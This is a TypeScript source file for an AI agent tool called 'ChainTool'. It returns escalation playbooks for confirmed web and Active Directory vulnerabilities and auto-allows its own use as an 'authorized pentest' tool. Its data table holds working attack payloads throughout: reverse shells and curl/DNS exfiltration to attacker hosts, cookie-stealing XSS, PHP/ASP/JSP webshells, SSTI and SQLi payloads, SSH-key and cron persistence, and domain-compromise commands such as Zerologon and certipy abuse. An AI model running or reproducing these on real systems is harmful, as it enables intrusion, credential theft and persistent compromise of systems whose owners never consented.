import { z } from 'zod/v4'
import { buildTool, type ToolDef } from '../../Tool.js'
import type { PermissionDecision } from '../../utils/permissions/PermissionResult.js'
import { lazySchema } from '../../utils/lazySchema.js'
import { renderToolResultMessage, renderToolUseProgressMessage } from './UI.js'

export const CHAIN_TOOL_NAME = 'Chain'

// Bug class → escalation vectors + technique + confirmation criteria
const CHAIN_DB: Record<string, {
  vectors: string[]
  technique: string
  confirmation: Record<string, string>
}> = {
  'open-redirect': {
    vectors: ['oauth-code-theft', 'token-theft-via-referer', 'csrf-bypass', 'phishing-chain', 'ssrf-if-server-side'],
    technique: `(1) OAuth: if target uses OAuth login, find the OAuth authorization URL → craft redirect_uri=<open-redirect-url>?next=attacker.com → start OAuth flow → provider redirects with ?code= to the open-redirect → code forwarded to attacker. (2) Token via Referer: if the redirected URL contains sensitive tokens in the path/query, they appear in attacker's server logs via Referer header. (3) SSRF upgrade: if the redirect is performed server-side (not just a 301 to user), it becomes SSRF. Test: does the server fetch the redirect URL itself? (4) Bypass filters: use // double slash (//attacker.com), javascript: URI, whitelisted-domain@evil.com, subdomain.whitelist.com.evil.com, %0d%0a (CRLF injection in Location header).`,
    confirmation: {
      'oauth-code-theft': 'auth code appears in attacker-controlled redirect URL callback',
      'token-theft-via-referer': 'token/session ID visible in Referer header at attacker endpoint',
      'csrf-bypass': 'CSRF action executes when redirect is used as return URL',
      'phishing-chain': 'victim domain appears in URL bar before final redirect to attacker page',
      'ssrf-if-server-side': 'server makes outbound HTTP request to attacker URL (confirmed via OOB callback)',
    },
  },
  'ssrf-blind': {
    vectors: ['cloud-metadata', 'kubernetes-api', 'internal-redis', 'internal-elastic', 'docker-daemon'],
    technique: `Cloud metadata (AWS): http://169.254.169.254/latest/meta-data/iam/security-credentials/ — GCP: http://metadata.google.internal/computeMetadata/v1/ with header Metadata-Flavor: Google — Azure: http://169.254.169.254/metadata/instance with Metadata: true. Kubernetes API: http://10.96.0.1/api/v1/namespaces/default/secrets (service account token at /var/run/secrets/kubernetes.io/serviceaccount/token gives full cluster access). Redis via Gopher: gopher://127.0.0.1:6379/_COMMAND. Docker daemon: http://127.0.0.1:2375/containers/json (no-auth Docker = host RCE). Confirm with OOB DNS callback first.`,
    confirmation: {
      'cloud-metadata': 'OOB DNS callback from server IP + IAM credentials in response body',
      'kubernetes-api': 'JSON response with k8s namespace/secret data',
      'internal-redis': 'PONG response or data dump via gopher',
    },
  },
  'ssrf': {
    vectors: ['cloud-metadata', 'kubernetes-api', 'internal-redis', 'docker-daemon', 'elasticsearch', 'port-scan-internal'],
    technique: `SSRF with direct response reading. (1) SSRFTool action=scan → auto-probe all cloud metadata + internal services. (2) AWS: retrieve IAM creds → use with CLI. (3) GCP: get bearer token → enumerate GCS/GCE. (4) Kubernetes: read SA token at /var/run/secrets/kubernetes.io/serviceaccount/token → kubectl with it. (5) Redis :6379: send SLAVE/REPLCONF command to dump data or eval Lua for RCE. (6) Docker :2375: POST /containers/create + POST /containers/{id}/start → RCE as root. (7) Elasticsearch :9200: GET /_cat/indices → GET /{index}/_search → data exfil. Port scan: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 on 22,80,443,3306,5432,6379,9200,27017.`,
    confirmation: {
      'cloud-metadata': 'IAM role credentials in response body (AWS: access_key_id, secret_access_key)',
      'kubernetes-api': 'k8s API response ({"apiVersion":...,"kind":...}) — read SA token next',
      'docker-daemon': '{"Id":...,"Names":...} container list in response',
      'elasticsearch': 'cluster health or index data returned',
      'port-scan-internal': 'different response times or content for open vs closed ports',
    },
  },
  'stored-xss': {
    vectors: ['admin-csrf', 'account-takeover', 'token-exfil', 'session-hijack', 'keylogger', 'csp-bypass'],
    technique: `(1) Cookie theft: document.cookie → exfil via fetch('https://attacker.com/?c='+document.cookie) or XHR. Note: HttpOnly blocks this — check if it's set. (2) localStorage token theft: localStorage.getItem('auth_token') or sessionStorage — XSS can always read these. (3) Admin CSRF: if XSS fires in admin panel, use fetch() with credentials to make admin actions: add user, reset password, disable 2FA. (4) Capture credentials (keylogger): intercept form submit via input event listener → exfil before submission. (5) Escalate to full account takeover: if admin cookie obtained → replay it from attacker machine → admin access. (6) CSP bypass: use allowed sources (CDN, same-domain), JSONP endpoints, data: URIs, or base64 encoding. Check CSP header first with DiffTool or browser devtools.`,
    confirmation: {
      'admin-csrf': 'admin action executes (new user created, email changed, MFA disabled) via XSS fetch',
      'account-takeover': 'admin session cookie or JWT token received at attacker server, successfully replayed',
      'token-exfil': 'localStorage/sessionStorage JWT or API key received at attacker endpoint',
      'session-hijack': 'valid cookie received; new session established with victim identity',
      'keylogger': 'form credentials submitted to attacker endpoint before original form submission',
    },
  },
  'reflected-xss': {
    vectors: ['csrf-bypass', 'phishing-account-takeover', 'token-steal-from-url'],
    technique: `CSRF bypass: XSS + SameSite bypass via credentialed fetch. Token steal: XSS in post-auth page may access tokens in localStorage/sessionStorage. Phishing: craft shareable URL that fires XSS on visit.`,
    confirmation: {
      'csrf-bypass': 'CSRF action executes via credentialed XSS fetch',
      'token-steal-from-url': 'JWT/API key extracted from localStorage and received at attacker endpoint',
    },
  },
  'idor-read': {
    vectors: ['idor-write', 'idor-delete', 'vertical-escalation', 'financial-impact', 'pii-bulk-exfil'],
    technique: `(1) Horizontal: read object N → try N+1, N-1, N-100 with your own session token. (2) Write: PUT/PATCH/DELETE same object with your token — can you modify another user's data? (3) Vertical: take your low-priv token and try admin-only endpoints (/admin/users, /api/v1/admin/*). (4) Financial: if orders/invoices/payments → change price, status, quantity. (5) Bulk: enumerate integer ID range (0-999999) and download all accessible records. (6) UUID/GUID: if non-sequential, try parameter pollution, swapping with another user's GUID from a shared resource, or base64 decoding to find internal IDs.`,
    confirmation: {
      'idor-write': 'another user\'s data successfully modified via your session (name, email, settings changed)',
      'vertical-escalation': 'admin endpoint accessible or admin function executed with non-admin token',
      'financial-impact': 'price, amount, payment status, or quantity changed',
      'pii-bulk-exfil': 'enumerated N user records via sequential ID scan in a single session',
    },
  },
  'cors-wildcard': {
    vectors: ['credential-exfil', 'api-key-theft', 'private-data-read'],
    technique: `CORS wildcard only matters WITH credentialed requests. Test: does server respond with Access-Control-Allow-Credentials: true? If yes, craft a page that makes credentialed cross-origin requests and exfiltrates the response. Particularly powerful on /api endpoints that return tokens or PII.`,
    confirmation: {
      'credential-exfil': 'cross-origin credentialed request returns auth token/API key',
      'private-data-read': 'cross-origin credentialed request returns PII or private data',
    },
  },
  'path-traversal': {
    vectors: ['lfi-to-rce', 'credential-file-read', 'source-code-disclosure', 'proc-self-exfil'],
    technique: `Bypass filter techniques: (1) ../ → %2e%2e%2f (URL encode), %2e%2e/ (partial), ....// (doubled dots), ..././ (extra dot). (2) Try PHP wrappers: php://filter/convert.base64-encode/resource=/etc/passwd → then base64 decode. (3) Target files in priority: /etc/passwd → /proc/self/environ → /proc/self/cmdline → /proc/net/tcp → /var/log/apache2/access.log → /.env → /var/www/html/config.php → ~/.ssh/id_rsa → /etc/shadow. LFI→RCE: (a) log poisoning: inject PHP in User-Agent → include access.log. (b) session poisoning: set session cookie value to PHP code → include session file. (c) zip wrapper: zip://upload.zip#shell.php. RFI (allow_url_include=On): include http://attacker.com/shell.php.`,
    confirmation: {
      'lfi-to-rce': 'command execution via log/session poisoning (id output or DNS callback)',
      'credential-file-read': '/etc/shadow hashes, ~/.ssh/id_rsa, or .env secrets retrieved',
      'source-code-disclosure': 'application PHP/Python source code retrieved via php://filter wrapper',
      'proc-self-exfil': '/proc/self/environ (env vars) or /proc/net/tcp (internal IPs) retrieved',
    },
  },
  'sqli': {
    vectors: ['auth-bypass', 'data-exfil', 'rce-via-into-outfile', 'second-order-sqli'],
    technique: `Auth bypass: ' OR '1'='1'-- or admin'-- . Data exfil: UNION SELECT or blind boolean/time-based. RCE: if FILE privilege: SELECT ... INTO OUTFILE '/var/www/html/shell.php'. Second-order: inject into stored field, trigger in different context. Time-based confirmation: SLEEP(5) × 5 interleaved samples for signal vs jitter.`,
    confirmation: {
      'auth-bypass': 'login succeeds with payload without valid credentials',
      'data-exfil': 'database version, schema, or user data extracted',
      'rce-via-into-outfile': 'web shell accessible at uploaded path, command execution confirmed',
    },
  },
  'ssti': {
    vectors: ['rce', 'file-read', 'ssrf-from-template', 'env-variable-leak'],
    technique: `Jinja2/Twig RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}. Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()>${'$'}{ex("id")}. Velocity: #set($rt=$x.class.forName('java.lang.Runtime'))... File read: {{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}. Env leak: {{config}} or {{settings}}.`,
    confirmation: {
      'rce': 'id/whoami output or DNS callback with hostname in template output',
      'file-read': 'file contents (e.g., /etc/passwd lines) present in response',
    },
  },
  'file-upload': {
    vectors: ['rce-webshell', 'xxe-via-svg', 'xss-via-html', 'path-traversal-via-filename', 'asp-webshell', 'jsp-webshell'],
    technique: `(1) PHP webshell: <?php system($_GET['c']); ?> → bypass extensions: .php5, .phtml, .pHp, .php.jpg (null byte), change Content-Type to image/jpeg. If content filtered: add JPEG magic bytes (FF D8 FF) before PHP tag. (2) ASP.NET: <%@ Page Language="C#" %><% Response.Write(Server.Execute(Request["c"])); %> → .aspx extension. (3) JSP: <%=Runtime.getRuntime().exec(request.getParameter("c"))%> → .jsp extension. (4) Find upload path: FuzzTool wordlist=raft on /uploads/ /files/ /media/ /static/ /images/. (5) JPEG/PNG polyglot: combine image header with executable payload. (6) SVG→XXE: XXETool action=svg file_path=/etc/passwd → include XXE payload in SVG for image rasterizers. (7) Filename traversal: use ../../../etc/cron.d/backdoor or ../../.htaccess as filename.`,
    confirmation: {
      'rce-webshell': 'webshell accessible at upload path, id output returned via ?c=id',
      'xxe-via-svg': 'file contents returned in SVG render response or OOB DNS callback with data',
      'xss-via-html': 'JavaScript executes when uploaded HTML is accessed in browser',
      'path-traversal-via-filename': 'file written outside intended upload directory',
    },
  },
  // AD-specific chains
  'kerberoast': {
    vectors: ['offline-crack', 'lateral-movement', 'privilege-escalation'],
    technique: `After obtaining TGS hashes (GetUserSPNs.py or ADAttackTool kerberoast): crack with hashcat -m 13100. If service account has weak password (cracked), use those creds for lateral movement via evil-winrm or smbexec. If the service account is a DA or has GenericAll/WriteDACL, pivot to priv-esc. Check BloodHound for account privileges after cracking.`,
    confirmation: {
      'offline-crack': 'password cracked — credential valid (confirmed via NXC spray)',
      'lateral-movement': 'authenticated shell on target machine using cracked credentials',
    },
  },
  'asreproast': {
    vectors: ['offline-crack', 'lateral-movement'],
    technique: `AS-REP hashes (GetNPUsers.py): crack with hashcat -m 18200. If cracked, same path as kerberoast. AS-REP roasting requires preauth disabled on account — lower bar than kerberoast but less common.`,
    confirmation: {
      'offline-crack': 'AS-REP hash cracked, credential valid (confirmed via NXC)',
    },
  },
  'adcs-esc1': {
    vectors: ['domain-admin', 'domain-persistence', 'lateral-movement'],
    technique: `ESC1: Subject Alternative Name abuse. certipy req -username <user> -password <pass> -ca <CA-NAME> -template <TEMPLATE> -upn administrator@domain.com. Then certipy auth -pfx cert.pfx. Gets NTLM hash of administrator. Use with secretsdump or pass-the-hash. ESC8: relay NTLM to ADCS HTTP endpoint via ntlmrelayx + coerce. ESC3: enrollment agent cert → request cert on behalf of DA.`,
    confirmation: {
      'domain-admin': 'NTLM hash of Domain Admin obtained and used to authenticate',
    },
  },
  'ntlm-relay': {
    vectors: ['rbcd', 'ldap-signing-bypass', 'smb-lateral', 'adcs-esc8'],
    technique: `With ntlmrelayx + coerce (PetitPotam/Coercer): relay to LDAP (if signing not required) for RBCD: add msDS-AllowedToActOnBehalfOfOtherIdentity on target machine. Then getST.py to impersonate DA. Relay to ADCS HTTP for ESC8 certificate. Relay to SMB for file access. Check NXC smb <subnet> --gen-relay-list for non-signing targets.`,
    confirmation: {
      'rbcd': 'silver ticket obtained via getST, authenticated as DA to target',
      'adcs-esc8': 'certificate for DA obtained via relay to ADCS HTTP',
    },
  },
  'coerce': {
    vectors: ['ntlm-relay', 'dcsync', 'lateral-movement'],
    technique: `Coerce DC authentication (PetitPotam, PrinterBug, Coercer) → relay to: LDAP (if no signing) for RBCD, ADCS HTTP for ESC8 cert, or capture NTLMv2 hash and crack. If coercing DC and relaying to ADCS: full Domain Compromise chain. Use Responder + ntlmrelayx simultaneously.`,
    confirmation: {
      'ntlm-relay': 'NTLMv2 hash captured or relay succeeds',
      'dcsync': 'DCSync via RBCD or ESC8 certificate → NTDS dump',
    },
  },
  'bloodhound-path': {
    vectors: ['acl-abuse', 'kerberoast-path', 'delegation-abuse'],
    technique: `Follow shortest path to DA in BloodHound. Common ACL edges: GenericAll/WriteDACL → reset password or add to group. ForceChangePassword → change user's password directly. AddMember → add self to privileged group. Kerberoast if SPN on path node. Constrained/Unconstrained delegation on path: impersonate DA.`,
    confirmation: {
      'acl-abuse': 'password reset or group membership change executed successfully',
      'delegation-abuse': 'impersonation ticket obtained for DA',
    },
  },
  'zerologon': {
    vectors: ['secretsdump', 'full-compromise'],
    technique: `CVE-2020-1472: exploit with secretsdump or dedicated PoC. Resets DC machine account password to empty. Then secretsdump.py -no-pass -just-dc <DOMAIN/DC$@DC-IP> dumps all hashes. CRITICAL: restore DC machine account password after test to avoid breaking replication. Confirm scope allows this test.`,
    confirmation: {
      'secretsdump': 'NTDS.dit hashes dumped (all domain hashes retrieved)',
      'full-compromise': 'DA NTLM hash obtained and used to authenticate',
    },
  },
  'deserialization': {
    vectors: ['rce-ysoserial', 'rce-native-gadget', 'ssrf-from-deserial', 'auth-bypass'],
    technique: `Java: identify serialized objects (magic bytes AC ED 00 05 in base64: rO0AB). Use ysoserial gadget chains — try in order: Commons-Collections3, Commons-Collections4, Spring1, Spring2, CommonsCollections6 (most universal). Generate: java -jar ysoserial.jar CommonsCollections6 'id' | base64. Send as request body, cookie, or parameter. PHP: look for PHP object injection in cookie/parameter (O:4:"User":1:{...}). Python: pickle loads — base64-encoded pickled payload. .NET: ViewState HMAC bypass via MachineKey leak, or insecure BinaryFormatter. Look for serialized data in: HTTP body, cookies, JSON fields with base64 content, XML, API responses.`,
    confirmation: {
      'rce-ysoserial': 'DNS callback received from server or command output returned (id, whoami)',
      'rce-native-gadget': 'application-specific gadget chain triggers code execution',
      'ssrf-from-deserial': 'SSRF triggered during deserialization (JNDI lookup, URLClassLoader)',
    },
  },
  'lfi': {
    vectors: ['log-poisoning-rce', 'credential-read', 'source-code-disclosure', 'rfi-rce'],
    technique: `Log poisoning→RCE: (1) Check /var/log/apache2/access.log, /var/log/nginx/access.log via LFI. (2) Inject PHP into User-Agent: <?php system($_GET['c']); ?> (send any request with this UA). (3) Include the log file via LFI: ?page=/var/log/apache2/access.log&c=id. SSH log poisoning: ssh '<?php system($_GET["c"]); ?>'@target — injects into /var/log/auth.log. Proc self fd: /proc/self/fd/N to access open file handles — test /proc/self/fd/0 through /proc/self/fd/20. Session file inclusion: find session dir (/var/lib/php/sessions/) from phpinfo via LFI, poison session cookie value, include session file. RFI: if allow_url_include=On, use ?page=http://attacker.com/shell.php. Read: /proc/self/environ (env vars), /etc/passwd, /etc/shadow, ~/.ssh/id_rsa, /var/www/html/.env, /app/config/*.yaml.`,
    confirmation: {
      'log-poisoning-rce': 'id output or DNS callback when log file included via LFI',
      'credential-read': '/etc/shadow or .env file contents retrieved',
      'rfi-rce': 'remote shell loaded and command output returned',
    },
  },
  'command-injection': {
    vectors: ['reverse-shell', 'data-exfil', 'lateral-movement-ssh', 'persistence'],
    technique: `Confirm RCE first: inject ;id, |id, $(id), \`id\` — if uid= appears in response, confirmed. For blind cmdi: ;sleep 5 (timing), ;curl http://attacker.com/$(id|base64) (OOB with data), ;dig $(id|base64).attacker.com (DNS exfil). Reverse shell one-liners (try in order): bash -i >& /dev/tcp/ATTACKER/4444 0>&1 | encoded as: ;bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261. Python: python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["sh"])'. Netcat: ;nc ATTACKER 4444 -e /bin/bash. After shell: run PrivEscTool action=all. Lateral: read ~/.ssh/id_rsa, /etc/hosts, .bash_history for credentials. Add persistence: echo 'ATTACKER_KEY' >> ~/.ssh/authorized_keys, add cron job: */1 * * * * curl http://ATTACKER/$(hostname).`,
    confirmation: {
      'reverse-shell': 'shell connection received at listener, interactive command execution',
      'data-exfil': 'command output received via OOB channel (DNS, HTTP callback)',
      'lateral-movement-ssh': 'SSH private key retrieved, used to authenticate to other hosts',
    },
  },
  'csrf': {
    vectors: ['state-changing-action', 'admin-takeover', 'oauth-misuse', 'sameSite-bypass'],
    technique: `CSRF is only exploitable without SameSite=Strict+Lax cookies AND with state-changing GET/POST. (1) Identify vulnerable endpoint: no CSRF token, no SameSite cookie, accepts GET for state change. (2) Build exploit page: <form action="https://target.com/api/change-email" method="POST"><input name="email" value="attacker@evil.com"></form><script>document.forms[0].submit()</script>. (3) For JSON endpoints: use fetch('https://target.com/api/action', {method:'POST', credentials:'include', body:...}). SameSite bypass: use navigator.sendBeacon(), top-level navigation, form from same-domain iframes. Admin CSRF: if XSS fires in admin context, use it for CSRF → higher privilege.`,
    confirmation: {
      'state-changing-action': 'forged request executes on behalf of victim (email changed, password reset, order placed)',
      'admin-takeover': 'admin action executed via CSRF (new admin created, settings changed)',
      'sameSite-bypass': 'CSRF fires despite SameSite cookie via XSS or meta-redirect from same domain',
    },
  },
  'xxe': {
    vectors: ['lfi-file-read', 'ssrf-pivot', 'credential-theft', 'rce-via-ssrf'],
    technique: `XXE is valuable only if you pivot to LFI or SSRF. (1) Confirm with XXETool action=detect. (2) File read chain: XXETool action=file_read file_path=/etc/passwd → then /proc/net/tcp (map internal IPs) → then /root/.ssh/id_rsa or /home/<user>/.ssh/id_rsa → then app config files (.env, wp-config.php, application.properties, database.yml). (3) SSRF chain: XXETool action=ssrf → probe cloud metadata (169.254.169.254) → internal Redis/ES/k8s (see SSRF chain). (4) SSRF→RCE: if internal Gopher-capable endpoint found (Redis :6379), exploit via SSRF→eval. (5) Blind XXE: use OOB DNS callback to confirm, then exfiltrate via DNS (encode file content in subdomain).`,
    confirmation: {
      'lfi-file-read': '/etc/passwd content, SSH private key, or app secrets retrieved',
      'ssrf-pivot': 'cloud metadata or internal service content returned via XXE SSRF',
      'credential-theft': 'database password, API key, or private key obtained from config files',
    },
  },
  'subdomain-takeover': {
    vectors: ['claim-dangling-cname', 'cookie-theft', 'phishing', 'oauth-redirect'],
    technique: `Subdomain takeover: a CNAME record points to an external service that no longer hosts the target. (1) Identify: DNS lookup shows CNAME pointing to *.github.io, *.s3.amazonaws.com, *.azurewebsites.net, *.herokuapps.com, etc. with NXDOMAIN response. (2) Verify: the hosting provider shows "no such repository" / "project not found" / "bucket not found". (3) Claim: create account on that platform and create project/bucket matching the CNAME target. (4) Escalate: (a) Set cookies for the parent domain from the subdomain — steal session cookies if parent is *.target.com and uses domain=.target.com cookies. (b) Host phishing page on legitimate subdomain URL. (c) Use as trusted redirect_uri for OAuth if subdomain is whitelisted. (d) Host malicious JavaScript that makes same-origin requests to parent APIs.`,
    confirmation: {
      'claim-dangling-cname': 'successfully created content on the claimed subdomain accessible at the original URL',
      'cookie-theft': 'page hosted on claimed subdomain can read cookies set for parent domain',
      'oauth-redirect': 'claimed subdomain URL accepted as redirect_uri in OAuth flow',
    },
  },
  'race-condition': {
    vectors: ['double-spend', 'privilege-escalation', 'account-takeover', 'inventory-bypass'],
    technique: `Race conditions exploit TOCTOU (time-of-check/time-of-use) gaps. (1) Find: state-changing operations that check a condition then act (transfer funds, apply discount, use referral, upgrade account). (2) Test: send multiple simultaneous requests using parallel fetch() or Turbo Intruder. (3) Double-spend: if "use coupon" applies discount then marks used, send 20 simultaneous requests → some succeed before mark completes. (4) Privilege escalation: concurrent role-change and action requests may race. (5) Confirm: check final state — was discount applied multiple times? Balance changed incorrectly? Confirmation email sent twice?`,
    confirmation: {
      'double-spend': 'discount/coupon applied multiple times or resource used more than once',
      'privilege-escalation': 'action completed with higher-privilege state than should have been possible',
    },
  },
  'cors-credentialed': {
    vectors: ['api-key-theft', 'pii-exfil', 'admin-action-csrf', 'account-takeover'],
    technique: `CORS with ACAC:true + ACAO:origin is critical (not the wildcard variant). Exploit: host a page that makes credentialed XHR to the target API and exfiltrates the response. Code: fetch('https://target.com/api/me', {credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://attacker.com/'+JSON.stringify(d))). Specific targets: (1) /api/me or /api/profile → PII + API key exfil. (2) /api/admin/* → if reflected, test admin-only mutations. (3) Stateful operations (POST /api/password/change, PUT /api/settings) — may chain to account takeover without CSRF token. (4) Session tokens from /api/auth — replay them from attacker site.`,
    confirmation: {
      'api-key-theft': 'cross-origin credentialed request returns API key or session token in response body',
      'pii-exfil': 'user PII retrieved cross-origin with victim credentials',
      'account-takeover': 'password/email change or admin action executes via credentialed CORS request',
    },
  },
  'wordpress': {
    vectors: ['admin-rce-plugin', 'auth-bypass-xmlrpc', 'sqli-in-plugin', 'plugin-file-upload-rce', 'user-enum-bruteforce'],
    technique: `Step 1: NucleiTool profile=wordpress — scans for vulnerable plugins/themes (2000+ templates). Step 2: Check xmlrpc.php enabled — if yes, test system.multicall for brute-force amplification and DoS. Also check if it leaks user list. Step 3: Enumerate users via /?author=1, /?author=2 or /wp-json/wp/v2/users API — get usernames for brute-force. Step 4: BruteForceTool against wp-login.php or xmlrpc.php with usernames from step 3 + rockyou. Step 5: Once admin access gained: install/update a plugin to add webshell, or edit a PHP file via Appearance→Theme Editor. Step 6: Look for SQLi in plugins — FuzzTool on all ?plugin_param= parameters. Step 7: Check /wp-json/wp/v2/ REST API for unauthenticated data exposure (posts, users, comments).`,
    confirmation: {
      'admin-rce-plugin': 'plugin uploaded with PHP webshell, command execution confirmed via HTTP request',
      'auth-bypass-xmlrpc': 'xmlrpc.php accepts any credentials or returns username list',
      'sqli-in-plugin': 'plugin parameter reflects database error or boolean difference',
      'user-enum-bruteforce': 'valid admin credentials found, wp-admin dashboard accessible',
    },
  },
  'graphql': {
    vectors: ['idor-via-introspection', 'sqli-in-resolver', 'batch-amplification', 'ssrf-via-field', 'dos-depth-abuse'],
    technique: `Step 1: GraphQLTool action=introspect — if schema is returned, enumerate all Query/Mutation types. Look for: user(id), admin, orders, payments, internal* fields (likely IDOR). Step 2: GraphQLTool action=batch — if true, batch amplification enables brute-force and rate-limit bypass: send 100 login attempts in one HTTP request. Step 3: GraphQLTool action=inject on any string ID field — look for SQL errors. Step 4: GraphQLTool action=suggest — reveals hidden field names. Step 5: check mutations — createUser, updatePassword, deleteAccount without ownership checks = IDOR write. For SSRF: look for fields like fetch(url), proxy(target), avatar(imageUrl) — test with SSRFTool. For DoS: GraphQLTool action=dos — deep nesting and alias batching.`,
    confirmation: {
      'idor-via-introspection': 'authenticated as user A, access user B\'s data via query { user(id: "B") { ... } }',
      'sqli-in-resolver': 'SQL error in response body, or boolean difference (user found vs. not found with payload)',
      'batch-amplification': 'array response returned, server processes all queries → rate limit bypass confirmed',
      'ssrf-via-field': 'cloud metadata or internal service content returned in field response',
    },
  },
  'jwt-weak-secret': {
    vectors: ['privilege-escalation', 'account-takeover', 'full-api-bypass'],
    technique: `After cracking JWT secret with JWTTool action=crack: forge a new token with JWTTool action=forge using custom claims. Target claims: role=admin, is_admin=true, user_id=1, sub=administrator. Also try alg:none (JWTTool action=alg_none) in parallel — server may accept either. For RS256: obtain public key from /.well-known/jwks.json or /api/jwks then use JWTTool action=alg_confusion with the public key as HMAC secret. Test forged token against every API endpoint — admin endpoints may have different trust logic.`,
    confirmation: {
      'privilege-escalation': 'forged token with admin claims accepted by server, admin API accessible',
      'account-takeover': 'forged token with victim user_id/sub accepted, victim account data returned',
    },
  },
}

const inputSchema = lazySchema(() =>
  z.strictObject({
    bug_class: z
      .string()
      .describe(
        `Bug class to look up escalation vectors for. Known classes: ${Object.keys(CHAIN_DB).join(', ')}`,
      ),
    target_url: z
      .string()
      .optional()
      .describe('Target URL or hostname (included in the returned analysis context)'),
  }),
)
type InputSchema = ReturnType<typeof inputSchema>

const outputSchema = lazySchema(() =>
  z.object({
    found: z.boolean(),
    bug_class: z.string(),
    target_url: z.string().optional(),
    vectors: z.array(z.string()),
    technique: z.string(),
    confirmation: z.record(z.string(), z.string()),
    available_classes: z.array(z.string()),
  }),
)
type OutputSchema = ReturnType<typeof outputSchema>
export type Output = z.infer<OutputSchema>

export const ChainTool = buildTool({
  name: CHAIN_TOOL_NAME,
  shouldDefer: true, // lazy: schema deferred via ToolSearch; keeps security sessions eager
  searchHint: 'chain — escalation vectors for confirmed bugs: open-redirect, ssrf, xss, idor, sqli, ssti, lfi, deserialization, command-injection, jwt, graphql, file-upload, kerberoast, adcs, ntlm-relay, bloodhound',
  maxResultSizeChars: 20_000,
  async description(input) {
    const i = input as Partial<z.infer<InputSchema>>
    if (i.bug_class) return `Chain analysis: ${i.bug_class}`
    return 'Bug chain escalation lookup'
  },
  async prompt() {
    return `Given a confirmed vulnerability, looks up escalation vectors to chain it into higher-impact findings. Call this immediately after confirming any bug class. Returns: ordered escalation vectors, exact technique to test each, and confirmation criteria. Available classes: ${Object.keys(CHAIN_DB).join(', ')}.`
  },
  get inputSchema(): InputSchema {
    return inputSchema()
  },
  get outputSchema(): OutputSchema {
    return outputSchema()
  },
  userFacingName(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return i?.bug_class ? `Chain:${i.bug_class}` : 'Chain'
  },
  isConcurrencySafe() {
    return true
  },
  isReadOnly() {
    return true
  },
  toAutoClassifierInput(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `chain ${i?.bug_class ?? ''} ${i?.target_url ?? ''}`
  },
  async checkPermissions(input): Promise<PermissionDecision> {
    return {
      behavior: 'allow',
      updatedInput: input,
      decisionReason: { type: 'other', reason: 'Authorized pentest engagement tool' },
    }
  },
  async call(input, _context) {
    const i = input as z.infer<InputSchema>
    const entry = CHAIN_DB[i.bug_class.toLowerCase()]
    if (!entry) {
      return {
        data: {
          found: false,
          bug_class: i.bug_class,
          vectors: [],
          technique: '',
          confirmation: {},
          available_classes: Object.keys(CHAIN_DB),
        } satisfies Output,
      }
    }
    return {
      data: {
        found: true,
        bug_class: i.bug_class,
        target_url: i.target_url,
        vectors: entry.vectors,
        technique: entry.technique,
        confirmation: entry.confirmation,
        available_classes: Object.keys(CHAIN_DB),
      } satisfies Output,
    }
  },
  mapToolResultToToolResultBlockParam(data: Output, toolUseID) {
    if (!data.found) {
      return {
        tool_use_id: toolUseID,
        type: 'tool_result' as const,
        content: `Unknown bug class: "${data.bug_class}". Available: ${data.available_classes.join(', ')}`,
      }
    }
    const target = data.target_url ? ` on ${data.target_url}` : ''
    const lines: string[] = [
      `Chain analysis: ${data.bug_class}${target}`,
      '',
      '## Escalation vectors (in order of severity)',
      ...data.vectors.map((v, i) => `${i + 1}. ${v}`),
      '',
      '## Technique',
      data.technique,
      '',
      '## Confirmation criteria',
      ...Object.entries(data.confirmation).map(([v, c]) => `- ${v}: ${c}`),
    ]
    return { tool_use_id: toolUseID, type: 'tool_result' as const, content: lines.join('\n') }
  },
  getActivityDescription(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `Chain: ${i?.bug_class ?? 'vuln'}`
  },
  renderToolUseProgressMessage,
  renderToolUseMessage(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return i.bug_class ?? 'chain'
  },
  renderToolResultMessage,
} satisfies ToolDef<InputSchema, Output>)
